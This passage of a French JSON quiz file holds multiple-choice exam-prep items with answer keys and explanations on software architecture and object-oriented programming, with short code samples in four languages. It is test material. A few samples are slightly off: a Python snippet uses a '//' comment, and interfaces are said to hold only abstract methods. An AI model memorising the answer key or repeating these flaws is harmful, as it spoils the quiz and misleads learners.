                "Pour suivre la mode technique du moment, indépendamment du projet",
                "Parce que l'architecture n'a pas d'impact sur la maintenance de l'application",
                "En reliant le choix à la taille du projet, à l'équipe et aux besoins : séparation des responsabilités, testabilité, lisibilité du code, tout en assumant les limites de la solution retenue"
            ],
            "correct": 3,
            "explanation": "Le jury CDA n'évalue pas l'architecture elle-même mais la capacité à justifier un choix de conception. Grille de réponse :\n1. rappeler le contexte : taille du projet (une application de gestion n'a pas besoin de microservices), effectif de l'équipe, délais ;\n2. citer les critères : séparation des responsabilités, testabilité, maintenabilité, lisibilité ;\n3. assumer les limites du choix (montée en charge globale, stack unique) et les alternatives écartées.\nUn choix proportionné et assumé vaut mieux qu'une architecture sophistiquée mal maîtrisée."
        },
        {
            "theme": "L'architecture",
            "question": "Pouvez-vous représenter l'architecture globale de votre solution ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Non, l'architecture ne se représente pas, elle se lit uniquement dans le code",
                "Uniquement par une liste de tous les fichiers du projet",
                "En montrant uniquement la page d'accueil du site",
                "Oui, en dessinant les grands blocs : interface utilisateur, back-end, base de données, et les flux qui les relient (requêtes HTTP, requêtes SQL, réponses)"
            ],
            "correct": 3,
            "explanation": "Schéma attendu au tableau : front (navigateur) -> HTTP/JSON -> back (contrôleurs, services, modèles) -> SQL -> base de données.\nCompléments valorisés : le middleware d'authentification, les services externes (mail, paiement), l'hébergement.\nEn soutenance, savoir dessiner cette architecture en 30 secondes, proprement, et la commenter est un vrai plus : le jury vérifie que le candidat a une vision d'ensemble et pas seulement une connaissance fichier par fichier."
        },
        {
            "theme": "L'architecture",
            "question": "Quels sont les différents composants de votre système et comment communiquent-ils entre eux ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Les composants communiquent par écriture directe dans un fichier partagé",
                "La base de données appelle le navigateur quand elle a besoin de données",
                "Tous les composants fusionnent dans une seule classe centrale qui fait tout",
                "L'interface (navigateur) et le back-end communiquent par requêtes HTTP (JSON), le back-end expose contrôleurs et services qui interrogent la base de données via des requêtes SQL, et les composants internes s'appellent par des appels de méthodes"
            ],
            "correct": 3,
            "explanation": "Composants typiques d'une application web : front, API/contrôleurs, services métier, modèles/ORM, base de données, services tiers (mail, paiement).\nCanaux de communication :\n- HTTP/HTTPS (avec en-têtes, authentification, JSON) entre front et back ;\n- SQL entre la couche d'accès aux données et le SGBD ;\n- appels de méthodes entre les couches internes du back-end ;\n- files/messages pour les traitements asynchrones (emails, imports).\nPréciser le sens des flux et les contrats (endpoints, schémas de données) montre une vision architecturale claire."
        },
        {
            "theme": "L'architecture",
            "question": "Pourquoi avoir choisi une architecture en couches ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Parce que chaque couche peut évoluer et être testée indépendamment, avec des responsabilités clairement séparées (présentation, logique métier, accès aux données)",
                "Parce que les couches accélèrent automatiquement l'application",
                "Parce que c'est la seule architecture possible en PHP",
                "Parce que cela supprime le besoin d'une base de données"
            ],
            "correct": 0,
            "explanation": "Couches classiques : présentation (vues), métier (services), persistance (modèles, accès aux données).\nAvantages :\n- séparation des responsabilités (Separation of Concerns) ;\n- testabilité : on peut remplacer la couche d'accès aux données par un mock pour tester le métier ;\n- maintenance : chaque couche évolue indépendamment si les interfaces sont stables ;\n- réutilisation : la couche métier peut servir plusieurs interfaces (web, API).\nLimites à connaître : un peu plus de code (passage de données entre couches), risque de couches 'passantes' qui ne font que relayer.\nC'est la base du MVC et des architectures d'entreprise classiques."
        },
        {
            "theme": "L'architecture",
            "question": "Quelle est la différence entre une architecture monolithique et une architecture en microservices ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Monolithique : toute l'application est un seul bloc déployé d'un seul tenant ; microservices : l'application est découpée en services autonomes, déployables et scalables séparément, qui communiquent par API",
                "Le monolithe ne peut pas utiliser de base de données, contrairement aux microservices",
                "Les microservices suppriment le besoin de tests",
                "Il n'y a aucune différence, seul le nom du serveur change"
            ],
            "correct": 0,
            "explanation": "Monolithe :\n- un seul bloc : front, métier et données compilés/déployés ensemble ;\n- simple à développer, déployer et déboguer pour une petite équipe ;\n- mais montée en charge globale (tout scale ensemble) et stack unique.\nMicroservices :\n- services autonomes par domaine (comptes, commandes, paiements), chacun avec sa base si besoin ;\n- scalables et déployables unitairement, technologies hétérogènes possibles ;\n- mais complexité forte : communication réseau, transactions distribuées, observabilité, DevOps mature exigé.\nPour un projet de taille moyenne, le monolithe en couches bien structuré est le choix rationnel - et savoir le défendre est un attendu du jury CDA."
        },
        {
            "theme": "L'architecture",
            "question": "Quels sont les avantages et les inconvénients de votre architecture ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Avantages : aucun ; inconvénients : tous, c'est pour cela qu'elle évolue en permanence",
                "Avantages : elle est parfaite ; inconvénients : aucun, aucune amélioration n'est possible",
                "Avantages : lisibilité, séparation des responsabilités, testabilité, simplicité de déploiement ; inconvénients : montée en charge du bloc entier et risque de couplage si les frontières entre couches ne sont pas tenues",
                "Avantages : elle est rapide car elle ignore la sécurité ; inconvénients : aucun"
            ],
            "correct": 2,
            "explanation": "Le jury attend un bilan honnête, structuré en deux colonnes.\nAvantages typiques d'un monolithe en couches : développement rapide, un seul déploiement, débogage simple, structure claire pour une petite équipe, tout le contexte métier au même endroit.\nInconvénients : scalabilité limitée (tout redéployer pour un petit changement), dépendance à une stack unique, risque de couplage fort si la discipline des couches s'effondre.\nConclure par ce qu'on améliorerait avec plus de temps ou de charge (cache, découpage, services) : l'esprit critique sur ses propres choix est ce qui est évalué."
        },
        {
            "theme": "L'architecture",
            "question": "Comment votre application peut-elle monter en charge ?",
            "level": "Avancé",
            "filiere": "CDA",
            "answers": [
                "En agrandissant la police de l'interface pour que le serveur ait moins de texte à envoyer",
                "La montée en charge est impossible sans réécrire complètement l'application",
                "En stockant toutes les données dans le navigateur de l'utilisateur",
                "En optimisant la base (index, requêtes), en ajoutant des caches, en déléguant les traitements lourds en asynchrone, puis en scalant verticalement (machine plus puissante) ou horizontalement (plusieurs instances derrière un répartiteur de charge)"
            ],
            "correct": 3,
            "explanation": "Monter en charge = supporter plus d'utilisateurs sans dégradation.\nOrdre des leviers :\n1. mesurer d'abord (profiling, logs lents) pour trouver le goulot ;\n2. optimiser la base : index, requêtes, pagination ;\n3. caches : données chaudes (Redis), résultats calculés, cache applicatif ;\n4. traitements asynchrones : files pour les emails, imports, tâches lourdes ;\n5. scalabilité verticale (machine plus puissante) puis horizontale : plusieurs instances + load balancer, avec sessions externalisées pour ne pas dépendre d'une instance ;\n6. base de données : réplication, séparation lecture/écriture.\nLimite du monolithe : l'application scale en bloc entier - c'est là que le découpage en services peut se justifier."
        },
        {
            "theme": "L'architecture",
            "question": "Pourquoi n'avez-vous pas choisi une architecture microservices pour votre projet ?",
            "level": "Avancé",
            "filiere": "CDA",
            "answers": [
                "Parce que les microservices sont interdits en formation",
                "Parce qu'un microservice ne peut pas accéder à une base de données",
                "Parce que la taille du projet, l'effectif de l'équipe et les délais ne le justifiaient pas : les microservices ajoutent de la complexité (déploiements, communication réseau, tests) là où un monolithe en couches bien structuré suffit et reste maintenable",
                "Parce que les microservices ne permettent pas d'utiliser PHP"
            ],
            "correct": 2,
            "explanation": "Règle d'ingénierie : la complexité architecturale doit être proportionnelle au besoin.\nPour une application de taille moyenne avec une petite équipe, le monolithe reste le bon choix : déploiement unique, pas de latence réseau inter-services, débogage simple, tests plus faciles.\nLes microservices se justifient quand : plusieurs équipes travaillent en parallèle sur des domaines distincts, certains services ont des charges très différentes, on veut scaler un domaine isolément ou utiliser des technologies hétérogènes.\nLe jury CDA attend ce raisonnement de contexte, pas un dogme 'microservices partout'."
        },
        {
            "theme": "L'architecture",
            "question": "Si votre nombre d'utilisateurs était multiplié par 100, que changeriez-vous ?",
            "level": "Avancé",
            "filiere": "CDA",
            "answers": [
                "Rien, la même infrastructure supporterait naturellement 100 fois plus de trafic",
                "Je supprimerais la base de données pour accélérer l'application",
                "Je changerais uniquement la couleur du site pour rassurer les utilisateurs",
                "Je passerais à plusieurs instances derrière un répartiteur de charge, j'ajouterais des caches (Redis), j'optimiserais la base (index, réplication), je déplacerais les traitements lourds en asynchrone et j'ajouterais du monitoring et des tests de charge"
            ],
            "correct": 3,
            "explanation": "Réponse attendue, en escalier et dans l'ordre :\n1. mesurer : où sont les goulots (base ? CPU ? entrées/sorties ?) ;\n2. optimisation rapide : index, requêtes N+1, pagination, compression ;\n3. caches : données chaudes, résultats calculés ;\n4. scalabilité horizontale : N instances derrière un load balancer, sessions externalisées (Redis) pour ne pas dépendre d'une instance ;\n5. base de données : réplication, séparation lecture/écriture ;\n6. sur les zones très sollicitées seulement : découpage en services ;\n7. le surveiller : monitoring, métriques, tests de charge (k6, JMeter).\nCette question teste la connaissance des limites de sa propre architecture - un classique du jury CDA."
        }
    ],
    "La POO": [
        {
            "theme": "La POO",
            "question": "Qu'est-ce que la POO ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Une méthode de programmation basée sur les fonctions uniquement",
                "Un langage de programmation spécifique utilisé pour développer des applications orientées web",
                "Une manière de structurer le code sans utiliser de classes ni d'objets",
                "La Programmation Orientée Objet (POO) est un paradigme de programmation qui organise le code en unités logiques réutilisables appelées objets"
            ],
            "correct": 3,
            "explanation": "La Programmation Orientée Objet (POO) est un paradigme de programmation qui organise le code en unités logiques réutilisables appelées objets.\nL'objectif principal de la POO est de créer du code modulaire, réutilisable et facile à maintenir.\nEn organisant le code en objets, les développeurs peuvent mieux modéliser le monde réel et résoudre des problèmes complexes de manière structurée."
        },
        {
            "theme": "La POO",
            "question": "Quels sont les quatre piliers fondamentaux de la POO ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "L'abstraction, l'encapsulation, l'héritage et le polymorphisme",
                "Les boucles, les conditions, les variables et les fonctions",
                "Les attributs, les classes, les interfaces et les packages",
                "Le typage fort, la compilation, l'encapsulation et la récursivité"
            ],
            "correct": 0,
            "explanation": "Les quatre piliers fondamentaux de la Programmation Orientée Objet sont :\n\t- L' Abstraction consiste à se concentrer sur les informations essentielles et à ignorer les détails non pertinents.\nElle permet de créer des classes qui représentent des concepts généraux.\n\t- L' Encapsulation est le processus qui consiste à regrouper les données et les méthodes dans une classe, cachant les détails d'implémentation.\nCela permet de protéger les données et de garantir l'intégrité de l'objet.\n\t- L' Héritage est la capacité d'une classe (classe fille) à hériter des propriétés et des méthodes d'une autre classe (classe mère).\nCela permet de créer une hiérarchie de classes et de réutiliser du code.\n\t- Le Polymorphisme est la capacité d'objets de différentes classes à répondre à un même message (méthode).\nCela permet d'écrire du code générique qui peut fonctionner avec des objets de différents types."
        },
        {
            "theme": "La POO",
            "question": "Qu'est-ce que l'abstraction ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une méthode permettant de cacher les erreurs dans le code",
                "Une technique pour optimiser la mémoire utilisée par les objets",
                "L'abstraction consiste à se concentrer sur les informations essentielles et à ignorer les détails non pertinents : on parle de modèle",
                "Une façon d'empêcher l'héritage entre les classes"
            ],
            "correct": 2,
            "explanation": "L' abstraction consiste à se concentrer sur les informations essentielles et à ignorer les détails non pertinents : on parle de modèle.\nOn l'utilise pour gérer la complexité et se concentrer sur l'essentiel.\n\nVoici des exemples simples d'abstraction dans différents langages :\n\nExemple en <b>JavaScript</b>:\nclass Voiture {\n  constructor(marque) {\n    this.marque = marque;\n  }\n\n  demarrer() {\n    console.log(`La ${this.marque} démarre.`);\n  }\n}\n\nconst maVoiture = new Voiture('Toyota');\n\n// Affiche : La Toyota démarre.\nmaVoiture.demarrer(); \n\nExemple en <b>Java</b> :\npublic class Voiture {\n  private String marque;\n\n  public Voiture(String marque) {\n    this.marque = marque;\n  }\n\n  public void demarrer() {\n    System.out.println(\"La \" + marque + \" démarre.\");\n  }\n}\n\n// Dans une autre classe ou méthode main\nVoiture maVoiture = new Voiture(\"Honda\");\n\n// Affiche : La Honda démarre.\nmaVoiture.demarrer(); \n\nExemple en <b>PHP</b> :\nclass Voiture {\n  private $marque;\n\n  public function __construct($marque) {\n    $this->marque = $marque;\n  }\n\n  public function demarrer() {\n    echo \"La {$this->marque} démarre.\";\n  }\n}\n\n$maVoiture = new Voiture('Renault');\n\n// Affiche : La Renault démarre.\n$maVoiture->demarrer();\n\n<b>Exemple en Python</b> :\nclass Voiture:\n  def __init__(self, marque):\n    self.marque = marque\n\n  def demarrer(self):\n    print(f\"La {self.marque} démarre.\")\n\nma_voiture = Voiture('Peugeot')\n\n# Affiche : La Peugeot démarre.\nma_voiture.demarrer()"
        },
        {
            "theme": "La POO",
            "question": "Qu'est-ce que l'encapsulation ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "L'encapsulation est un principe de la POO qui consiste à regrouper les données (attributs) et les méthodes qui les manipulent au sein d'une même unité (la classe), tout en restreignant l'accès direct à ces données",
                "Un mécanisme permettant de créer plusieurs instances d'une même classe",
                "Une méthode utilisée pour combiner plusieurs classes en une seule",
                "Un processus qui empêche la création d’objets à partir d’une classe"
            ],
            "correct": 0,
            "explanation": "L' encapsulation est un principe de la POO qui consiste à regrouper les données (attributs) et les méthodes qui les manipulent au sein d'une même unité (la classe), tout en restreignant l'accès direct à ces données.\nOn utilise généralement des attributs privés avec des méthodes publiques appelées getters (ou accesseurs) et setters (ou mutateurs) pour y accéder et les modifier.\n\nExemple en <b>JavaScript</b>:\n// Classe Personne\nclass Personne {\n  // Attribut privé (à partir d'ES2022)\n  #nom;\n\n  // Constructeur\n  constructor(nom) {\n    this.#nom = nom;\n  }\n\n  // Getter pour obtenir le nom\n  getNom() {\n    return this.#nom;\n  }\n\n  // Setter pour modifier le nom\n  setNom(nouveauNom) {\n    if (nouveauNom.length > 0) {\n        this.#nom = nouveauNom;\n    }\n  }\n}\n\n// Utilisation de la classe\nconst personne = new Personne('Alice');\n\n// Affiche : Alice\nconsole.log(personne.getNom());\n\n// Affiche : Bob\npersonne.setNom('Bob');\nconsole.log(personne.getNom()); Exemple en Java : // Classe Personne\npublic class Personne {\n  private String nom;\n\n  // Constructeur\n  public Personne(String nom) {\n    this.nom = nom;\n  }\n\n  // Getter pour obtenir le nom\n  public String getNom() {\n    return nom;\n  }\n\n  // Setter pour modifier le nom\n  public void setNom(String nouveauNom) {\n    if (nouveauNom != null && !nouveauNom.isEmpty()) {\n        this.nom = nouveauNom;\n    }\n  }\n}\n\n// Utilisation de la classe\nPersonne personne = new Personne(\"Alice\");\n\n// Affiche : Alice\nSystem.out.println(personne.getNom());\n\npersonne.setNom(\"Bob\");\n\n// Affiche : Bob\nSystem.out.println(personne.getNom()); Exemple en PHP : // Classe Personne\nclass Personne {\n  private $nom;\n\n  // Constructeur\n  public function __construct($nom) {\n    $this->nom = $nom;\n  }\n\n  // Getter pour obtenir le nom\n  public function getNom() {\n    return $this->nom;\n  }\n\n  // Setter pour modifier le nom\n  public function setNom($nouveauNom) {\n    if (!empty($nouveauNom)) {\n        $this->nom = $nouveauNom;\n    }\n  }\n}\n\n// Utilisation de la classe\n$personne = new Personne(\"Alice\");\n\n// Affiche : Alice\necho $personne->getNom() . \"\\n\";\n$personne->setNom(\"Bob\");\n\n// Affiche : Bob\necho $personne->getNom() . \"\\n\"; \n\n<b>Exemple en Python </b>: \n// Classe Personne\nclass Personne:\n  # Constructeur\n  def __init__(self, nom):\n    self.__nom = nom  # Attribut privé\n\n  # Getter pour obtenir le nom\n  def get_nom(self):\n    return self.__nom\n\n  # Setter pour modifier le nom\n  def set_nom(self, nouveau_nom):\n    if nouveau_nom:\n        self.__nom = nouveau_nom\n\n# Utilisation de la classe\npersonne = Personne(\"Alice\")\n\n# Affiche : Alice\nprint(personne.get_nom())\n\npersonne.set_nom(\"Bob\")\n\n# Affiche : Bob\nprint(personne.get_nom())"
        },
        {
            "theme": "La POO",
            "question": "Qu'est-ce que l'héritage ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une méthode permettant de copier automatiquement le code d'une autre classe",
                "Un processus de duplication d’objets identiques",
                "Un concept qui permet de créer plusieurs classes indépendantes sans lien entre elles",
                "L'héritage permet à une classe d'hériter des propriétés et méthodes d'une autre classe"
            ],
            "correct": 3,
            "explanation": "L' héritage permet à une classe d'hériter des propriétés et méthodes d'une autre classe.\nIl favorise la réutilisation du code et permet de créer des hiérarchies logiques.\nCependant, il peut créer des dépendances fortes entre les classes s'il est mal utilisé.\n\nExemple en <b>JavaScript</b>:\nclass Animal {\n  manger() {\n    console.log(\"L'animal mange.\");\n  }\n}\n\nclass Chien extends Animal {\n  aboyer() {\n    console.log(\"Le chien aboie.\");\n  }\n}\n\nconst monChien = new Chien();\nmonChien.manger();\nmonChien.aboyer(); Exemple en Java : class Animal {\n  void manger() {\n    System.out.println(\"L'animal mange.\");\n  }\n}\n\nclass Chien extends Animal {\n  void aboyer() {\n    System.out.println(\"Le chien aboie.\");\n  }\n}\n\npublic class ExempleHéritage {\n  public static void main(String[] args) {\n    Chien monChien = new Chien();\n    monChien.manger();\n    monChien.aboyer();\n  }\n} Exemple en PHP : class Animal {\n  public function manger() {\n    echo \"L'animal mange.\\n\";\n  }\n}\n\nclass Chien extends Animal {\n  public function aboyer() {\n    echo \"Le chien aboie.\\n\";\n  }\n}\n\n$monChien = new Chien();\n$monChien->manger();\n$monChien->aboyer();\n\n<b>Exemple en Python</b>:\nclass Animal:\n  def manger(self):\n    print(\"L'animal mange.\")\n\nclass Chien(Animal):\n  def aboyer(self):\n    print(\"Le chien aboie.\")\n\n# Utilisation\nmon_chien = Chien()\nmon_chien.manger()\nmon_chien.aboyer()"
        },
        {
            "theme": "La POO",
            "question": "Qu'est-ce que le polymorphisme ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "La capacité d’une méthode à changer son type de retour dynamiquement",
                "Une technique permettant de créer des objets à partir de plusieurs classes à la fois",
                "Le polymorphisme permet à des objets de classes différentes d'être traités comme des objets d'une classe commune",
                "Un concept qui empêche l’héritage entre les classes"
            ],
            "correct": 2,
            "explanation": "Le polymorphisme permet à des objets de classes différentes d'être traités comme des objets d'une classe commune.\nIl permet une grande flexibilité et extensibilité du code, mais peut rendre le code plus difficile à suivre s'il est mal utilisé.\n\nVoici des exemples dans différents langages illustrant le polymorphisme avec des quadrilatères.\n\nExemple en <b>JavaScript</b>:\nclass Forme {\n  dessiner() {\n    console.log(\"Forme\");\n  }\n}\n\nclass Rectangle extends Forme {\n  dessiner() {\n    console.log(\"Rectangle\");\n  }\n}\n\nclass Carre extends Forme {\n  dessiner() {\n    console.log(\"Carré\");\n  }\n}\n\n// Polymorphisme\nfunction dessinerForme(forme) {\n  forme.dessiner();\n}\n\nconst rectangle = new Rectangle();\nconst carre = new Carre();\ndessinerForme(rectangle);\ndessinerForme(carre); Exemple en Java : class Forme {\n  public void dessiner() {\n    System.out.println(\"Forme\");\n  }\n}\n\nclass Rectangle extends Forme {\n  public void dessiner() {\n    System.out.println(\"Rectangle\");\n  }\n}\n\nclass Carre extends Forme {\n  public void dessiner() {\n    System.out.println(\"Carré\");\n  }\n}\n\npublic class ExemplePolymorphisme {\n  // Polymorphisme\n  public static void dessinerForme(Forme forme) {\n    forme.dessiner();\n  }\n\n  public static void main(String[] args) {\n    Forme rectangle = new Rectangle();\n    Forme carre = new Carre();\n\n    dessinerForme(rectangle);\n    dessinerForme(carre);\n  }\n} Exemple en PHP : class Forme {\n  public function dessiner() {\n    echo \"Forme\\n\";\n  }\n}\n\nclass Rectangle extends Forme {\n  public function dessiner() {\n    echo \"Rectangle\\n\";\n  }\n}\n\nclass Carre extends Forme {\n  public function dessiner() {\n    echo \"Carré\\n\";\n  }\n}\n\n// Polymorphisme\nfunction dessinerForme(Forme $forme) {\n  $forme->dessiner();\n}\n\n$rectangle = new Rectangle();\n$carre = new Carre();\n\ndessinerForme($rectangle);\ndessinerForme($carre);\n\n<b>Exemple en Python</b>:\nclass Forme():\n  def dessiner(self):\n    print(\"Forme\")\n\n# Classe Rectangle\nclass Rectangle(Forme):\n  def dessiner(self):\n    print(\"Rectangle\")\n\n# Classe Carre\nclass Carre(Forme):\n  def dessiner(self):\n    print(\"Carré\")\n\n# Polymorphisme\ndef dessiner_forme(forme):\n  forme.dessiner()\n\n# Utilisation\nrectangle = Rectangle()\ncarre = Carre()\n\ndessiner_forme(rectangle)\ndessiner_forme(carre)"
        },
        {
            "theme": "La POO",
            "question": "Quelle est la différence entre une classe et un objet ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une classe est un modèle ou un plan pour créer des objets, tandis qu'un objet est une instance concrète de cette classe",
                "Une classe est un type de variable et un objet est une valeur numérique",
                "Une classe représente un fichier de code, tandis qu’un objet est une fonction qui s’exécute",
                "Une classe est créée à partir d’un objet déjà existant"
            ],
            "correct": 0,
            "explanation": "Une classe est un modèle ou un plan pour créer des objets, tandis qu'un objet est une instance concrète de cette classe.\n\nPar exemple, une 'Voiture' est une classe, tandis que 'maVoitureRouge' est un objet spécifique créé à partir de cette classe."
        },
        {
            "theme": "La POO",
            "question": "Qu'est-ce qu'une méthode abstraite ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Une méthode qui peut être modifiée pendant l’exécution du programme",
                "Une méthode utilisée pour créer automatiquement des objets",
                "Une méthode abstraite est une méthode déclarée sans implémentation dans une classe abstraite",
                "Une méthode qui ne peut être appelée qu’une seule fois"
            ],
            "correct": 2,
            "explanation": "Une méthode abstraite est une méthode déclarée sans implémentation dans une classe abstraite.\nLes classes dérivées doivent fournir une implémentation pour ces méthodes.\n\nVoici un exemple en <b>Java</b>.\nabstract class Animal {\n  abstract void faireDuBruit();\n}\n\nclass Chien extends Animal {\n  void faireDuBruit() {\n    System.out.println(\"Woof!\");\n  }\n}"
        },
        {
            "theme": "La POO",
            "question": "Qu'est-ce qu'une interface ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Une structure utilisée pour stocker les attributs d’un objet",
                "Une interface en POO est un contrat qui spécifie un ensemble de méthodes qu'une classe doit implémenter",
                "Une méthode permettant d’interagir directement avec le système d’exploitation",
                "Un outil graphique permettant de manipuler les objets d’un programme"
            ],
            "correct": 1,
            "explanation": "Une interface en POO est un contrat qui spécifie un ensemble de méthodes qu'une classe doit implémenter.\n\nVoici un exemple en Java.\ninterface Nageable {\n  void nager();\n}\n\nclass Poisson implements Nageable {\n  public void nager() {\n    System.out.println(\"Le poisson nage.\");\n  }\n}"
        },
        {
            "theme": "La POO",
            "question": "Quelle est la différence entre une classe abstraite et une interface ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Une classe abstraite est plus rapide à exécuter qu’une interface",
                "Les principales différences sont : - Une classe abstraite peut avoir des méthodes concrètes et abstraites, une interface n'a que des méthodes abstraites sous la forme de signature",
                "Une interface permet d'hériter d'une seule classe alors qu'une classe abstraite peut en implémenter plusieurs",
                "Les classes abstraites ne peuvent pas contenir de méthodes, contrairement aux interfaces"
            ],
            "correct": 1,
            "explanation": "Les principales différences sont :\n\t- Une classe abstraite peut avoir des méthodes concrètes et abstraites, une interface n'a que des méthodes abstraites sous la forme de signature.\n\t- Une classe peut hériter d'une seule classe abstraite, mais peut implémenter plusieurs interfaces.\n\t- Les classes abstraites peuvent avoir des constructeurs, pas les interfaces.\n\t- Les classes abstraites peuvent avoir des attributs d'instance, les interfaces ne peuvent avoir que des constantes."
        },
        {
            "theme": "La POO",
            "question": "Quelle est la différence entre une méthode de classe et une méthode d'instance ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une méthode d’instance appartient à la classe et ne peut pas être appelée via un objet",
                "Une méthode de classe (statique) appartient à la classe et peut être appelée sans instance",
                "Une méthode de classe s’exécute automatiquement à la création de l’objet",
                "Une méthode d’instance ne peut contenir aucun paramètre"
            ],
            "correct": 1,
            "explanation": "Une méthode de classe (statique) appartient à la classe et peut être appelée sans instance.\nUne méthode d'instance nécessite une instance pour être appelée.\n\nVoici des exemples :\nExemple en <b>JavaScript</b>:\nclass Exemple {\n  static methodeDeClasse() {\n    console.log(\"Méthode de classe.\");\n  }\n\n  methodeDInstance() {\n    console.log(\"Méthode d'instance.\");\n  }\n}\n\nExemple.methodeDeClasse();\n\nconst ex = new Exemple();\nex.methodeDInstance();\n\nExemple en <b>Java</b> :\nclass Exemple {\n  static void methodeDeClasse() {\n    System.out.println(\"Méthode de classe.\");\n  }\n\n  void methodeDInstance() {\n    System.out.println(\"Méthode d'instance.\");\n  }\n}\n\npublic class Main {\n  public static void main(String[] args) {\n    Exemple.methodeDeClasse();\n\n    Exemple ex = new Exemple();\n    ex.methodeDInstance();\n  }\n}\n\nExemple en <b>PHP</b> :\nclass Exemple {\n  public static function methodeDeClasse() {\n    echo \"Méthode de classe.\\n\";\n  }\n\n  public function methodeDInstance() {\n    echo \"Méthode d'instance.\\n\";\n  }\n}\n\nExemple::methodeDeClasse();\n\n$ex = new Exemple();\n$ex->methodeDInstance();\n\n<b>Exemple en Python</b>:\nclass Exemple:\n  @classmethod\n  def methodeDeClasse(cls):\n    print(\"Méthode de classe.\")\n\n  def methodeDInstance(self):\n    print(\"Méthode d'instance.\")\n\nExemple.methodeDeClasse()\n\nex = Exemple()\nex.methodeDInstance()"
        },
        {
            "theme": "La POO",
            "question": "Qu'est-ce que le \"getter\" et le \"setter\" ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Des fonctions utilisées pour initialiser les objets lors de leur création",
                "Des outils du compilateur pour vérifier les types de variables",
                "Des méthodes utilisées pour calculer la taille d’une classe",
                "Les getters (ou accesseurs) et setters (ou mutateurs) sont des méthodes utilisées pour accéder et modifier les attributs privés d'une classe, respectant ainsi le principe d'encapsulation"
            ],
            "correct": 3,
            "explanation": "Les getters (ou accesseurs) et setters (ou mutateurs) sont des méthodes utilisées pour accéder et modifier les attributs privés d'une classe, respectant ainsi le principe d'encapsulation.\n\nExemple en <b>JavaScript</b>:\nclass Personne {\n  constructor(nom) {\n    this._nom = nom;\n  }\n\n  get nom() {\n    return this._nom;\n  }\n\n  set nom(nouveauNom) {\n    this._nom = nouveauNom;\n  }\n}\n\nExemple en <b>Java</b> :\npublic class Personne {\n  private String nom;\n\n  public String getNom() {\n    return nom;\n  }\n\n  public void setNom(String nom) {\n    this.nom = nom;\n  }\n} \n\nExemple en <b>PHP</b> :\nclass Personne {\n  private $nom;\n\n  public function getNom() {\n    return $this->nom;\n  }\n\n  public function setNom($nom) {\n    $this->nom = $nom;\n  }\n} \n\nExemple en <b>Python</b>:\nclass Personne:\n  def __init__(self, nom):\n    self._nom = nom\n\n  @property\n  def nom(self):\n    return self._nom\n\n  @nom.setter\n  def nom(self, nouveau_nom):\n    self._nom = nouveau_nom"
        },
        {
            "theme": "La POO",
            "question": "Qu'est-ce que le concept de constructeur ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une fonction utilisée pour supprimer des objets de la mémoire",
                "Un élément optionnel permettant de copier les propriétés d'une autre classe",
                "Un constructeur est une méthode spéciale d'une classe qui est automatiquement appelée lors de la création d'un nouvel objet de cette classe",
                "Un outil externe servant à compiler le code d’une classe"
            ],
            "correct": 2,
            "explanation": "Un constructeur est une méthode spéciale d'une classe qui est automatiquement appelée lors de la création d'un nouvel objet de cette classe.\nIl est utilisé pour initialiser les attributs de l'objet et effectuer toute configuration nécessaire.\n\nVoici des exemples dans différents langages :\nExemple en <b>JavaScript</b> :\nclass Voiture {\n  constructor(marque, modele) {\n    this.marque = marque;\n    this.modele = modele;\n  }\n\n  afficherInfo() {\n    console.log(`Voiture: ${this.marque} ${this.modele}`);\n  }\n}\n\nconst maVoiture = new Voiture('Toyota', 'Corolla');\nmaVoiture.afficherInfo();\n\nExemple en <b>Java</b> :\npublic class Voiture {\n  private String marque;\n  private String modele;\n\n  public Voiture(String marque, String modele) {\n    this.marque = marque;\n    this.modele = modele;\n  }\n\n  public void afficherInfo() {\n    System.out.println(\"Voiture: \" + marque + \" \" + modele);\n  }\n}\n\nVoiture maVoiture = new Voiture(\"Honda\", \"Civic\");\nmaVoiture.afficherInfo(); \n\nExemple en <b>PHP</b> :\nclass Voiture {\n  private $marque;\n  private $modele;\n\n  public function __construct($marque, $modele) {\n    $this->marque = $marque;\n    $this->modele = $modele;\n  }\n\n  public function afficherInfo() {\n    echo \"Voiture: {$this->marque} {$this->modele}\";\n  }\n}\n\n$maVoiture = new Voiture('Renault', 'Clio');\n$maVoiture->afficherInfo();\n\nExemple en <b>Python</b>:\nclass Voiture:\n  def __init__(self, marque, modele):\n    self.marque = marque\n    self.modele = modele\n\n  def afficher_info(self):\n    print(f\"Voiture: {self.marque} {self.modele}\")\n\nma_voiture = Voiture('Peugeot', '308')\nma_voiture.afficher_info()"
        },
        {
            "theme": "La POO",
            "question": "Qu'est-ce que le concept de 'this'/'self' ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un mot-clé réservé utilisé uniquement dans les fonctions statiques pour référencer la classe entière",
                "Une variable temporaire utilisée pour stocker le nom d'une méthode",
                "Le mot-clé this (en JavaScript et Java) ou self (en Python) ou $this (en PHP) fait référence à l'instance actuelle de la classe dans laquelle il est utilisé",
                "Un alias utilisé pour importer une autre classe dans le même fichier"
            ],
            "correct": 2,
